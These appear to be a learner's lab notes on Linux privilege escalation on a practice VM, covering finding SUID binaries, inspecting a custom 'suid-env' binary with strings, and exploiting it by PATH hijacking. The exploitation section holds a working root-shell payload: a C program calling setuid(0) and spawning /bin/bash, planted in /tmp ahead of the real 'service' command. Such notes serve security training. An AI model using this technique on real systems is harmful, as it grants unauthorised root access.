## Detection

**Linux VM**

1. List all SUID binaries:
   ```bash
   find / -type f -perm -04000 -ls 2>/dev/null
   ```

![[Pasted image 20240917203904.png]]

- If a file with the SUID bit is misconfigured or vulnerable (such as a custom script or binary), an attacker could potentially use it to execute code as root. For example:
    
    - A vulnerable SUID program could allow users to spawn a root shell or modify critical system files.
    - If `/tmp/bash` is a custom SUID file, it might be a backdoor left to escalate privileges.
- **Custom Binaries (`suid-env`, `suid-env2`)**: These custom binaries in `/usr/local/bin` might be part of a privesc attempt or vulnerable utilities. You should analyze their content, or attempt to execute them, to see if they allow unintended privilege escalation.
    
- **Command Execution**: If you find a SUID file that you can manipulate (e.g., via environment variables or improper input handling), you can gain root-level access through it.

1. Check the functions used by the binary:
   ```bash
   strings /usr/local/bin/suid-env
   ```

3. Note the functions.
![[Pasted image 20240917205136.png]]
## Exploitation

**Linux VM**

1. Create a C file to escalate privileges:
   ```bash
   echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
   ```


2. Compile the service:
 ```bash
 gcc /tmp/service.c -o /tmp/service	
 
 ls /tmp
 
 echo $PATH

   ```

![[Pasted image 20240917211748.png]]
3. Set the PATH environment variable:
 ```bash

   export PATH=/tmp:$PATH
   echo $PATH
   
   ```

- When `/usr/local/bin/suid-env` runs, it needs to call `service apache2 start`. However, because you manipulated the `PATH` (with `export PATH=/tmp:$PATH`), the system will look in `/tmp` first for the `service` command.
- Your compiled `/tmp/service` executable is designed to escalate privileges by calling `setuid(0)` and `setgid(0)`, which gives you root privileges. Instead of starting the Apache service, it spawns a root shell (`/bin/bash`).v

4. Run the SUID binary:
   ```bash
   /usr/local/bin/suid-env
   ```

![[Pasted image 20240917211811.png]]
5. Check your user ID:
   ```bash
   id
   ```



6. reset the path 
```
source /etc/profile
or
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
source /etc/profile

```
